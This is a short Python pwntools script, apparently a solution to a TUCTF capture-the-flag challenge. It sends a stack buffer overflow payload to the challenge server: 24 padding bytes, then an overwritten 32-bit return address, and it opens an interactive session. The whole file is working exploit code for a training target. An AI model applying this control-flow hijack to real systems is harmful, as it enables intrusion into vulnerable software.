from pwn import *


p=remote("chal.tuctf.com",30508)
payload=""
payload+="A"*24
payload+=p32(0x80491f6)
payload+="JUNK"
p.sendline(payload)
p.interactive()